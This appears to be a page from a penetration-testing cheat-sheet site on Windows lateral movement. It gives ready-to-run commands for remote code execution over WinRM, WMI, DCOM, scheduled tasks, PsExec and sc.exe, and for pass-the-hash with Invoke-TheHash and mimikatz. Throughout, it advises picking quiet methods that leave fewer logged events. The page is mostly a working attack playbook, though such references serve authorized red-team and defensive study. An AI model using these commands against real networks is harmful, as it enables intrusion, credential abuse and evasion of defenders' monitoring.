---
title: "Lateral Movement"
---

# 🪟 Windows lateral movement

> _You stand on a domain-joined Windows host with creds, an NT hash or a logon session, and want to reach the next machine. This page is the **native / living-off-the-land** angle: bounce with signed Windows tooling already on the box instead of dropping impacket. For the impacket-from-Linux methods and the full loop see [AD post-exploitation](/active-directory/post-exploit/); for tunnels to unroutable hosts see [network pivoting](/network/pivoting/windows-native.md)._

## 📚 Resources

- [PsExec (Sysinternals)](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
- [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) - PtH over WMI/SMB, pure PowerShell
- [SharpMove](https://github.com/0xthirteen/SharpMove) / [SharpRDP](https://github.com/0xthirteen/SharpRDP) - C# WMI/DCOM/SCM and RDP execution
- [TheHackerRecipes - Lateral movement](https://www.thehacker.recipes/ad/movement/lateral-movement)

> Where is this account local admin? Spray first - see [map your reach](/active-directory/post-exploit/lateral-movement.md#map-your-reach) (`nxc smb $SUBNET -u $USER -p $PASSWORD`). A host flagged `(Pwn3d!)` is ready to execute on.

## 🚪 Remote execution (native)

> _Pick by footprint, not habit. WMI/WinRM leave no binary and no service - quiet defaults. `psexec`/`sc` drop a service (event 7045) - only when you need SYSTEM and noise is acceptable._

::: code-group

```powershell [WinRM / PSRemoting]
# WinRM (5985/5986), needs "Remote Management Users" - no binary dropped, logged as WinRM
$cred = Get-Credential
Invoke-Command -ComputerName $TARGET -Credential $cred -ScriptBlock { whoami; hostname }
Enter-PSSession -ComputerName $TARGET -Credential $cred   # interactive
```

```powershell [WMI]
# WMI, no service, no binary - low footprint, good default
$cred = Get-Credential
Invoke-CimMethod -ComputerName $TARGET -ClassName Win32_Process -MethodName Create `
  -Arguments @{CommandLine = "cmd /c $COMMAND"} -Credential $cred
```

```cmd [wmic]
:: Legacy one-liner (wmic is deprecated but still present on many hosts)
wmic /node:$TARGET /user:$DOMAIN\$USER /password:$PASSWORD process call create "cmd /c $COMMAND"
```

```powershell [DCOM]
# MMC20.Application COM object - executes via DCOM, blends into RPC traffic
$dcom = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "$TARGET"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c $COMMAND", "7")
```

```cmd [schtasks]
:: Remote scheduled task running as SYSTEM - no new binary, task is logged
schtasks /create /s $TARGET /u $DOMAIN\$USER /p $PASSWORD /tn "upd" /tr "cmd /c $COMMAND" /sc once /st 00:00 /ru system /f
schtasks /run /s $TARGET /u $DOMAIN\$USER /p $PASSWORD /tn "upd"
schtasks /delete /s $TARGET /tn "upd" /f    :: clean up
```

```cmd [PsExec]
:: Sysinternals PsExec - drops a service binary = SYSTEM shell, very noisy (7045, AV)
PsExec.exe \\$TARGET -u $DOMAIN\$USER -p $PASSWORD -s cmd.exe   :: -s = SYSTEM
PsExec.exe \\$TARGET -u $DOMAIN\$USER -p $PASSWORD "cmd /c $COMMAND"
```

```cmd [sc.exe]
:: Create + start a remote service (SYSTEM) - noisy (7045), survives if not cleaned
sc \\$TARGET create upd binPath= "cmd /c $COMMAND" start= demand
sc \\$TARGET start upd
sc \\$TARGET delete upd       :: clean up
```

:::

## 🔑 Pass-the-Hash (native)

> _Reuse an NT hash from a Windows host without cracking it. Three native-ish paths depending on what you have on the box._

### Invoke-TheHash (PowerShell, no admin needed locally)

```powershell
# WMI variant - quiet, no service
Invoke-WMIExec -Target $TARGET -Domain $DOMAIN -Username $USER -Hash $NT_HASH -Command "cmd /c $COMMAND"

# SMB (service) variant - noisy, SYSTEM shell
Invoke-SMBExec -Target $TARGET -Domain $DOMAIN -Username $USER -Hash $NT_HASH -Command "cmd /c $COMMAND"
```

### mimikatz sekurlsa::pth (local admin / SeDebug required)

```powershell
# Spawns a new process with the hash injected into its logon session
# Any native tool run from that process (net, dir \\host\C$, mstsc, PsExec) authenticates as $USER
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$NT_HASH /run:cmd.exe" exit
```

### runas /netonly (you know the password, not just the hash)

```cmd
:: Credentials used only for network auth - no local effect, no event 4624 locally
runas /netonly /user:$DOMAIN\$USER cmd.exe
```

For the Linux/impacket side (`-hashes :$NT_HASH`), see [AD pass-the-hash](/active-directory/kerberos/pass-the-hash.md).

## 🖥️ RDP

Covered in the dedicated RDP page: connection (xfreerdp, mstsc), [Pass-the-Hash from a Windows host](/network/services-pentesting/3389-rdp.md#pass-the-hash-from-a-windows-host) (mimikatz + `mstsc /restrictedadmin`), [enabling RDP remotely](/network/services-pentesting/3389-rdp.md#persistence-via-rdp), and [RDP through a pivot](/network/services-pentesting/3389-rdp.md#rdp-through-a-pivot).

See [RDP - 3389](/network/services-pentesting/3389-rdp.md).

## 🧭 Next steps

- [Credentials hunting](/active-directory/post-exploit/credentials-hunting.md) / [credential dumping](/active-directory/credential-dumping/) - loot the host you just reached
- [AD post-exploit](/active-directory/post-exploit/) - impacket methods (wmiexec/smbexec/psexec from Linux) + the full loop
- [Kerberos tickets](/active-directory/kerberos/tickets/) - golden/silver/sapphire tickets once DA is close
- [Network pivoting](/network/pivoting/windows-native.md) - tunnels to reach hosts your current box cannot
